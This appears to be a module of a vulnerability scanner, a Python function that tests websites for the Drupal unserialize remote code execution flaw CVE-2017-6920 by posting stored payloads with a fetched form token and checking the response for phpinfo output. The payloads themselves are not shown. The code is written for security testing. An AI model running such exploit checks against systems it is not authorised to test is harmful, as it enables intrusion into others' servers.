#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests

def cve_2017_6920_scan(self, url):
    '''  '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'unSerialize/RCE'
    vul_info['vul_id'] = 'CVE-2017-6920'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cve_2017_6920_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            form_token = self.get_form_token(target, vul_info)
            if (form_token):
                data = data.format(form_token)
            else:
                return None
            
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=self.headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            if (('PHP Version' in res.text) and ('PHP License' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Request': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
